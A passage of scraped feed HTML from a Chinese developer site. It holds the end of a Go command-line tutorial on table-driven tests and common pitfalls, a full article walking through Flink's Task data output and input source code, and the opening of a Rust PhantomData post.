<span class="hljs-keyword">import</span> <span class="hljs-string">"strings"</span>

<span class="hljs-keyword">var</span> reasonByLang = <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>{
	<span class="hljs-string">"go"</span>:     <span class="hljs-string">"编译快、部署简单、并发模型清晰，适合做基础设施和服务端。"</span>,
	<span class="hljs-string">"python"</span>: <span class="hljs-string">"生态丰富、验证快，适合数据处理和脚本。"</span>,
	<span class="hljs-string">"java"</span>:   <span class="hljs-string">"工程成熟、生态庞大，适合大型企业级系统。"</span>,
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Reason</span><span class="hljs-params">(lang <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> {
	key := strings.ToLower(strings.TrimSpace(lang))
	<span class="hljs-keyword">if</span> key == <span class="hljs-string">""</span> {
		key = <span class="hljs-string">"go"</span>
	}
	<span class="hljs-keyword">if</span> reason, ok := reasonByLang[key]; ok {
		<span class="hljs-keyword">return</span> reason
	}
	<span class="hljs-keyword">return</span> <span class="hljs-string">"先选一个目标场景，再决定语言。Go 适合服务端与工具链。"</span>
}
</code></pre>
<p><strong><code>map[string]string</code> 的声明</strong></p>
<p>这是 Go 的 map 类型，等价于 Java 的 <code>Map&lt;String, String&gt;</code> 或 Python 的 <code>dict</code>。</p>
<p><strong><code>reason, ok := reasonByLang[key]</code> 的双返回值</strong></p>
<p>访问 map 时，Go 允许你同时获取"值"和"是否存在"。如果 key 不存在，<code>ok</code> 为 false，<code>reason</code> 是零值。</p>
<p>这比 Java 的 <code>map.get(key) != null</code> 更优雅，因为它能区分"key 不存在"和"key 存在但值为 null"。</p>
<blockquote>
<p><strong>Go 知识点</strong>：这种 <code>value, ok := map[key]</code> 的写法叫做 "comma ok" 惯用法，在 Go 里非常常见。</p>
</blockquote>
<h3 data-id="heading-7">3.4 测试代码：表驱动测试</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestReason</span><span class="hljs-params">(t *testing.T)</span></span> {
	tests := []<span class="hljs-keyword">struct</span> {
		name <span class="hljs-type">string</span>
		lang <span class="hljs-type">string</span>
		want <span class="hljs-type">string</span>
	}{
		{name: <span class="hljs-string">"default"</span>, lang: <span class="hljs-string">""</span>, want: reasonByLang[<span class="hljs-string">"go"</span>]},
		{name: <span class="hljs-string">"go"</span>, lang: <span class="hljs-string">"go"</span>, want: reasonByLang[<span class="hljs-string">"go"</span>]},
		{name: <span class="hljs-string">"python"</span>, lang: <span class="hljs-string">"python"</span>, want: reasonByLang[<span class="hljs-string">"python"</span>]},
	}

	<span class="hljs-keyword">for</span> _, tt := <span class="hljs-keyword">range</span> tests {
		t.Run(tt.name, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t *testing.T)</span></span> {
			<span class="hljs-keyword">if</span> got := Reason(tt.lang); got != tt.want {
				t.Fatalf(<span class="hljs-string">"Reason(%q) = %q, want %q"</span>, tt.lang, got, tt.want)
			}
		})
	}
}
</code></pre>
<p>这是 Go 社区推崇的<strong>表驱动测试</strong>风格。把测试用例定义成一个切片，然后循环执行。好处是：</p>
<ul>
<li>新增用例只需要加一行，不用复制粘贴整个测试函数</li>
<li>测试逻辑集中，一眼能看出覆盖了哪些场景</li>
<li><code>t.Run()</code> 让每个用例有独立的名字，失败时能精确定位</li>
</ul>
<h2 data-id="heading-8">4. 避坑指南 &amp; 深度思考</h2>
<h3 data-id="heading-9">坑 1：忘记处理 error</h3>
<pre><code class="hljs language-go" lang="go">cfg, _ := cliinfo.Parse(os.Args[<span class="hljs-number">1</span>:])  <span class="hljs-comment">// 危险！忽略了 error</span>
</code></pre>
<p>用 <code>_</code> 忽略 error 是 Go 新手最常犯的错误。程序不会报错，但 <code>cfg</code> 可能是零值，后续逻辑会出现诡异的 bug。</p>
<p><strong>建议</strong>：在 IDE 里开启 <code>errcheck</code> 或 <code>golangci-lint</code>，它会提醒你未处理的 error。</p>
<h3 data-id="heading-10">坑 2：全局 flag 导致测试困难</h3>
<p>如果你直接用 <code>flag.String()</code> 和 <code>flag.Parse()</code>，它们操作的是全局状态。多个测试用例之间会互相干扰，而且无法模拟不同的参数组合。</p>
<p><strong>建议</strong>：始终用 <code>flag.NewFlagSet()</code> 创建独立的解析器。</p>
<h3 data-id="heading-11">坑 3：错误信息不够具体</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">return</span> Config{}, fmt.Errorf(<span class="hljs-string">"参数错误"</span>)  <span class="hljs-comment">// 太模糊</span>
<span class="hljs-keyword">return</span> Config{}, fmt.Errorf(<span class="hljs-string">"name 不能为空"</span>)  <span class="hljs-comment">// 好</span>
</code></pre>
<p>错误信息要能让用户<strong>不看代码就知道怎么修</strong>。</p>
<h3 data-id="heading-12">Demo 与生产的差距</h3>
<p>这个 Demo 是教学用的，生产环境还需要考虑：</p>
<ul>
<li><strong>配置文件支持</strong>：除了命令行参数，还要支持从文件、环境变量读取配置</li>
<li><strong>日志系统</strong>：用 <code>log/slog</code> 或 <code>zap</code> 替代 <code>fmt.Println</code>，支持结构化日志</li>
<li><strong>优雅退出</strong>：监听 <code>SIGTERM</code> 信号，做清理工作后再退出</li>
<li><strong>版本信息</strong>：编译时注入 git commit、构建时间等信息</li>
</ul>
<h2 data-id="heading-13">5. 快速上手 &amp; 改造建议</h2>
<h3 data-id="heading-14">运行命令</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 进入项目目录</span>
<span class="hljs-built_in">cd</span> series/02

<span class="hljs-comment"># 运行程序（使用默认参数）</span>
go run ./cmd/cli

<span class="hljs-comment"># 运行程序（自定义参数）</span>
go run ./cmd/cli -name=<span class="hljs-string">"汪小成"</span> -lang=python

<span class="hljs-comment"># 运行测试</span>
go <span class="hljs-built_in">test</span> ./...
</code></pre>
<h3 data-id="heading-15">工程化改造建议</h3>
<p><strong>1. 添加结构化日志</strong></p>
<p>把 <code>fmt.Println</code> 替换成 Go 1.21 引入的 <code>log/slog</code>：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">import</span> <span class="hljs-string">"log/slog"</span>

slog.Info(<span class="hljs-string">"程序启动"</span>, <span class="hljs-string">"name"</span>, cfg.Name, <span class="hljs-string">"lang"</span>, cfg.Lang)
</code></pre>
<p><strong>2. 支持环境变量</strong></p>
<p>在 <code>Parse()</code> 里增加环境变量的读取，优先级：命令行参数 &gt; 环境变量 &gt; 默认值：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">if</span> envName := os.Getenv(<span class="hljs-string">"CLI_NAME"</span>); envName != <span class="hljs-string">""</span> &amp;&amp; *name == <span class="hljs-string">"工程师"</span> {
    *name = envName
}
</code></pre>
<p><strong>3. 添加 <code>-version</code> 参数</strong></p>
<p>在编译时注入版本信息，方便排查问题：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">var</span> Version = <span class="hljs-string">"dev"</span>  <span class="hljs-comment">// 编译时用 -ldflags 覆盖</span>

version := fs.Bool(<span class="hljs-string">"version"</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">"显示版本信息"</span>)
<span class="hljs-keyword">if</span> *version {
    fmt.Println(<span class="hljs-string">"版本:"</span>, Version)
    os.Exit(<span class="hljs-number">0</span>)
}
</code></pre>
<h2 data-id="heading-16">6. 总结</h2>
<ul>
<li><strong>main 函数要短</strong>：只做调度，不写业务逻辑，这样才能测试</li>
<li><strong>错误必须处理</strong>：<code>if err != nil</code> 是 Go 的生存法则，别用 <code>_</code> 忽略</li>
<li><strong>用 NewFlagSet</strong>：独立的 flag 解析器让代码可测试</li>
<li><strong>internal 目录</strong>：Go 的访问控制机制，内部包不会被外部引用</li>
<li><strong>表驱动测试</strong>：用切片组织测试用例，新增场景只需加一行</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flink源码阅读：Task数据交互]]></title>    <link>https://juejin.cn/post/7591744347826372634</link>    <guid>https://juejin.cn/post/7591744347826372634</guid>    <pubDate>2026-01-05T14:49:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591744347826372634" data-draft-id="7591744347826356250" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flink源码阅读：Task数据交互"/> <meta itemprop="keywords" content="Flink,大数据"/> <meta itemprop="datePublished" content="2026-01-05T14:49:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="面向Google编程"/> <meta itemprop="url" content="https://juejin.cn/user/1063982986695374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flink源码阅读：Task数据交互
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1063982986695374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    面向Google编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-05T14:49:46.000Z" title="Mon Jan 05 2026 14:49:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>经过前面的学习，Flink 的几个核心概念相关的源码实现我们已经了解了。本文我们来梳理 Task 的数据交互相关的源码。</p>
<h3 data-id="heading-0">数据输出</h3>
<p>话不多说，我们直接进入正题。首先来看 Task 的数据输出，在进入流程之前，我们先介绍几个基本概念。</p>
<h4 data-id="heading-1">基本概念</h4>
<ul>
<li>RecordWriterOutput：它是 Output 接口的一个具体实现类，底层使用 RecordWriter 来发送数据。</li>
<li>RecordWriter：数据写入的执行者，负责将数据写到 ResultPartition。</li>
<li>ResultPartition 和 ResultSubpartition：ResultPartition 是 ExecutionGraph 中一个节点的输出结果，下游的每个需要从当前 ResultPartition 消费数据的 Task 都会有一个 ResultSubpartition。</li>
<li>ChannelSelector：用来决定一个 Record 要被写到哪个 Subpartition 中。</li>
<li>LocalBufferPool：用来管理 Buffer 的缓冲池。在介绍反压的原理时，我们提到过。</li>
</ul>
<p>对这些基本概念有了一定的了解之后，我们来看数据输出的具体流程。</p>
<h4 data-id="heading-2">执行流程</h4>
<p>我们以 map 为例，看一下数据的输出过程。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ed568cbc1734c71ae96ca84bb8c8305~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768229385&amp;x-signature=LNbTqu9p6Ye7O7tH2oz32i0hyQs%3D" alt="DataOutput" loading="lazy"/></p>
<p>在 <code>StreamMap.processElement</code> 方法中，调用完 map 方法之后，就会调用 <code>output.collect</code> 方法将数据输出，这里的 output 就是 RecordWriterOutput。在 RecordWriterOutput 中，会调用 RecordWriter 的 emit 方法。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">private</span> &lt;X&gt; <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">pushToRecordWriter</span>(<span class="hljs-params">StreamRecord&lt;X&gt; <span class="hljs-keyword">record</span></span>)</span> {
    serializationDelegate.setInstance(<span class="hljs-keyword">record</span>);

    <span class="hljs-keyword">try</span> {
        recordWriter.emit(serializationDelegate);
    } <span class="hljs-keyword">catch</span> (IOException e) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> UncheckedIOException(e.getMessage(), e);
    }
}
</code></pre>
<p>这里的 serializationDelegate 是用来对 record 进行序列化的。RecordWriter 有两个实现类，一个是 ChannelSelectorRecordWriter，另一个是 BroadcastRecordWriter。ChannelSelectorRecordWriter 需要先调用 ChannelSelector 选择对应的 subparition，然后进行写入。BroadcastRecordWriter 则是写到所有的 subparition。</p>
<p>接下来就是调用 <code>BufferWritingResultPartition.emitRecord</code> 来写入数据。</p>
<pre><code class="hljs language-scss" lang="scss">public void <span class="hljs-built_in">emitRecord</span>(ByteBuffer record, int targetSubpartition) throws IOException {
    totalWrittenBytes += record<span class="hljs-selector-class">.remaining</span>();

    BufferBuilder buffer = <span class="hljs-built_in">appendUnicastDataForNewRecord</span>(record, targetSubpartition);

    while (record.hasRemaining()) {
        <span class="hljs-comment">// full buffer, partial record</span>
        <span class="hljs-built_in">finishUnicastBufferBuilder</span>(targetSubpartition);
        buffer = <span class="hljs-built_in">appendUnicastDataForRecordContinuation</span>(record, targetSubpartition);
    }

    if (buffer.isFull()) {
        <span class="hljs-comment">// full buffer, full record</span>
        <span class="hljs-built_in">finishUnicastBufferBuilder</span>(targetSubpartition);
    }

    <span class="hljs-comment">// partial buffer, full record</span>
}
</code></pre>
<p>这里把 record 写入到 buffer 中，如果 buffer 不够，则会从 LocalBufferPool 中申请新的 buffer，申请到之后就会继续写入。下面是具体的申请过程。</p>
<pre><code class="hljs language-scss" lang="scss">private MemorySegment <span class="hljs-built_in">requestMemorySegment</span>(int targetChannel) {
    MemorySegment segment = null;
    synchronized (availableMemorySegments) {
        <span class="hljs-built_in">checkDestroyed</span>();

        if (!availableMemorySegments.isEmpty()) {
            segment = availableMemorySegments<span class="hljs-selector-class">.poll</span>();
        } else if (isRequestedSizeReached()) {
            <span class="hljs-comment">// Only when the buffer request reaches the upper limit(i.e. current pool size),</span>
            <span class="hljs-comment">// requests an overdraft buffer.</span>
            segment = <span class="hljs-built_in">requestOverdraftMemorySegmentFromGlobal</span>();
        }

        if (segment == null) {
            return null;
        }

        if (targetChannel != UNKNOWN_CHANNEL) {
            if (++subpartitionBuffersCount[targetChannel] == maxBuffersPerChannel) {
                unavailableSubpartitionsCount++;
            }
        }

        <span class="hljs-built_in">checkAndUpdateAvailability</span>();
    }
    return segment;
}
</code></pre>
<p>如果有可用内存，就直接从队列中出队。如果达到了本地 BufferPool 的上限，就从全局的 NetworkBufferPool 中申请，申请不到就会阻塞写入过程，等待申请。最后还会检查并更新可用内存状态。</p>
<p>有了可用的 buffer 之后，就会调用 addToSubpartition，最终数据存储在 PipelinedSubpartition 的 buffers 队列中。</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">void</span> <span class="hljs-title">addToSubpartition</span><span class="hljs-params">(
        BufferBuilder buffer,
        <span class="hljs-type">int</span> targetSubpartition,
        <span class="hljs-type">int</span> partialRecordLength,
        <span class="hljs-type">int</span> minDesirableBufferSize)</span>
        throws IOException </span>{
    <span class="hljs-type">int</span> desirableBufferSize =
            subpartitions[targetSubpartition].<span class="hljs-built_in">add</span>(
                    buffer.<span class="hljs-built_in">createBufferConsumerFromBeginning</span>(), partialRecordLength);

    <span class="hljs-built_in">resizeBuffer</span>(buffer, desirableBufferSize, minDesirableBufferSize);
}
</code></pre>
<h3 data-id="heading-3">数据输入</h3>
<p>看完了数据输出的过程之后，我们再来看一下数据输入的过程。首先还是了解几个基本概念。</p>
<h4 data-id="heading-4">基本概念</h4>
<ul>
<li>InputGate：InputGate 是对输入的封装，与 JobGraph 中的 JobEdge 一一对应，每个 InputGate 消费上游一个或多个 Resultpartition。</li>
<li>InputChannel：InputChannel 是和 ExecutionGraph 中的 ExecutionEdge 一一对应的。每个 InputChannel 接收一个 ResultSubpartition 的输出，InputChannel 主要关注 LocalInputChannel 和 RemoteInputChannel 两种实现。</li>
</ul>
<h4 data-id="heading-5">执行流程</h4>
<p>了解了具体概念之后，我们再看数据输入的具体流程。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54ab8cf05ba14bc1b0a643b621cec5fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768229385&amp;x-signature=ekrK1mD9nROVo2i0Adeh1eL98bk%3D" alt="RecordInput" loading="lazy"/></p>
<p>数据输入的入口是 <code>StreamTask.processInput</code> 方法，这个方法中主要是调用 <code>inputProcessor.processInput</code> 方法，我们以 StreamOneInputProcessor 为例。这个方法就是调用 <code>input.emitNext</code> 方法。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> DataInputStatus emitNext(DataOutput&lt;T&gt; output) throws Exception {

    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        <span class="hljs-comment">// get the stream element from the deserializer</span>
        <span class="hljs-keyword">if</span> (currentRecordDeserializer != <span class="hljs-literal">null</span>) {
            RecordDeserializer.DeserializationResult result;
            <span class="hljs-keyword">try</span> {
                result = currentRecordDeserializer.getNextRecord(deserializationDelegate);
            } <span class="hljs-keyword">catch</span> (IOException e) {
                <span class="hljs-keyword">throw</span> new IOException(
                        String.format(<span class="hljs-string">"Can't get next record for channel %s"</span>, lastChannel), e);
            }
            <span class="hljs-keyword">if</span> (result.isBufferConsumed()) {
                currentRecordDeserializer = <span class="hljs-literal">null</span>;
            }

            <span class="hljs-keyword">if</span> (result.isFullRecord()) {
                <span class="hljs-keyword">final</span> boolean breakBatchEmitting =
                        processElement(deserializationDelegate.getInstance(), output);
                <span class="hljs-keyword">if</span> (canEmitBatchOfRecords.check() &amp;&amp; !breakBatchEmitting) {
                    <span class="hljs-keyword">continue</span>;
                }
                <span class="hljs-keyword">return</span> DataInputStatus.MORE_AVAILABLE;
            }
        }

        Optional&lt;BufferOrEvent&gt; bufferOrEvent = checkpointedInputGate.pollNext();
        <span class="hljs-keyword">if</span> (bufferOrEvent.isPresent()) {
            <span class="hljs-comment">// return to the mailbox after receiving a checkpoint barrier to avoid processing of</span>
            <span class="hljs-comment">// data after the barrier before checkpoint is performed for unaligned checkpoint</span>
            <span class="hljs-comment">// mode</span>
            <span class="hljs-keyword">if</span> (bufferOrEvent.<span class="hljs-keyword">get</span>().isBuffer()) {
                processBuffer(bufferOrEvent.<span class="hljs-keyword">get</span>());
            } <span class="hljs-keyword">else</span> {
                DataInputStatus status = processEvent(bufferOrEvent.<span class="hljs-keyword">get</span>(), output);
                <span class="hljs-keyword">if</span> (status == DataInputStatus.MORE_AVAILABLE &amp;&amp; canEmitBatchOfRecords.check()) {
                    <span class="hljs-keyword">continue</span>;
                }
                <span class="hljs-keyword">return</span> status;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">if</span> (checkpointedInputGate.isFinished()) {
                checkState(
                        checkpointedInputGate.getAvailableFuture().isDone(),
                        <span class="hljs-string">"Finished BarrierHandler should be available"</span>);
                <span class="hljs-keyword">return</span> DataInputStatus.END_OF_INPUT;
            }
            <span class="hljs-keyword">return</span> DataInputStatus.NOTHING_AVAILABLE;
        }
    }
}
</code></pre>
<p>这里是调用 <code>checkpointedInputGate.pollNext</code> 来获取输入的数据。它的内部就是调用 InputGate 的 pollNext 方法来获取数据。当获取到完整数据之后，就会调用 processElement 来处理数据。</p>
<p>我们以 SingleInputGate 为例看 InputGate 的 pollNext 方法。它的内部调用链路可用一直追踪到 readBufferFromInputChannel 方法，这个方法内会调用 <code>inputChannel.getNextBuffer</code>，这里交给 InputChannel 来具体执行数据读取。</p>
<pre><code class="hljs language-scss" lang="scss">public Optional&lt;BufferAndAvailability&gt; <span class="hljs-built_in">getNextBuffer</span>() throws IOException {
    <span class="hljs-built_in">checkError</span>();

    if (!toBeConsumedBuffers.isEmpty()) {
        return <span class="hljs-built_in">getBufferAndAvailability</span>(toBeConsumedBuffers.removeFirst());
    }

    ResultSubpartitionView subpartitionView = this<span class="hljs-selector-class">.subpartitionView</span>;
    if (subpartitionView == null) {
        <span class="hljs-comment">// There is a possible race condition between writing a EndOfPartitionEvent (1) and</span>
        <span class="hljs-comment">// flushing (3) the Local</span>
        <span class="hljs-comment">// channel on the sender side, and reading EndOfPartitionEvent (2) and processing flush</span>
        <span class="hljs-comment">// notification (4). When</span>
        <span class="hljs-comment">// they happen in that order (1 - 2 - 3 - 4), flush notification can re-enqueue</span>
        <span class="hljs-comment">// LocalInputChannel after (or</span>
        <span class="hljs-comment">// during) it was released during reading the EndOfPartitionEvent (2).</span>
        if (isReleased) {
            return Optional<span class="hljs-selector-class">.empty</span>();
        }

        <span class="hljs-comment">// this can happen if the request for the partition was triggered asynchronously</span>
        <span class="hljs-comment">// by the time trigger</span>
        <span class="hljs-comment">// would be good to avoid that, by guaranteeing that the requestPartition() and</span>
        <span class="hljs-comment">// getNextBuffer() always come from the same thread</span>
        <span class="hljs-comment">// we could do that by letting the timer insert a special "requesting channel" into the</span>
        <span class="hljs-comment">// input gate's queue</span>
        subpartitionView = <span class="hljs-built_in">checkAndWaitForSubpartitionView</span>();
    }

    BufferAndBacklog next = subpartitionView<span class="hljs-selector-class">.getNextBuffer</span>();
    <span class="hljs-comment">// ignore the empty buffer directly</span>
    while (next != null &amp;&amp; next.buffer()<span class="hljs-selector-class">.readableBytes</span>() == <span class="hljs-number">0</span>) {
        next<span class="hljs-selector-class">.buffer</span>()<span class="hljs-selector-class">.recycleBuffer</span>();
        next = subpartitionView<span class="hljs-selector-class">.getNextBuffer</span>();
        numBuffersIn<span class="hljs-selector-class">.inc</span>();
    }

    if (next == null) {
        if (subpartitionView.isReleased()) {
            throw new <span class="hljs-built_in">CancelTaskException</span>(
                    "Consumed partition " + subpartitionView + " has been released.");
        } else {
            return Optional<span class="hljs-selector-class">.empty</span>();
        }
    }

    Buffer buffer = next<span class="hljs-selector-class">.buffer</span>();

    if (buffer instanceof FullyFilledBuffer) {
        List&lt;Buffer&gt; partialBuffers = ((FullyFilledBuffer) buffer)<span class="hljs-selector-class">.getPartialBuffers</span>();
        int seq = next<span class="hljs-selector-class">.getSequenceNumber</span>();
        for (Buffer partialBuffer : partialBuffers) {
            toBeConsumedBuffers<span class="hljs-selector-class">.add</span>(
                    new BufferAndBacklog(
                            partialBuffer,
                            next.buffersInBacklog(),
                            buffer<span class="hljs-selector-class">.getDataType</span>(),
                            seq++));
        }

        return <span class="hljs-built_in">getBufferAndAvailability</span>(toBeConsumedBuffers.removeFirst());
    }

    return <span class="hljs-built_in">getBufferAndAvailability</span>(next);
}
</code></pre>
<p>我们先来看 LocalInputChannel，先获取到了 subpartitionView，并调用 getNextBuffer，这里其实就是从 PipelinedSubpartition 的 buffers 队列中读取数据。</p>
<p>RemoteInputChannel 则需要从 receivedBuffers 中读取数据，这个队列的数据就是消费上游数据后保存的。</p>
<p>至此，Flink 中 Task 的数据输入和输出过程的源码就梳理完了，更加底层的 Netty 相关代码我们在后面继续梳理。</p>
<h3 data-id="heading-6">总结</h3>
<p>最后简单总结一下，本文我们梳理了 Task 的数据输出和输入的过程。输出过程主要是利用 RecordWriter 将数据写入到 Buffer 中，输入过程则是利用 InputChannel 从 Buffer 消费的过程。如果你的 Flink 任务数据量特别大，并且没什么复杂的逻辑，可以考虑适当调整 localBufferPool 的大小来调优任务的吞吐。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Rust 的 `PhantomData`：零成本把“语义信息”交给编译器]]></title>    <link>https://juejin.cn/post/7591705084671344678</link>    <guid>https://juejin.cn/post/7591705084671344678</guid>    <pubDate>2026-01-05T15:31:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591705084671344678" data-draft-id="7591728734982766619" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Rust 的 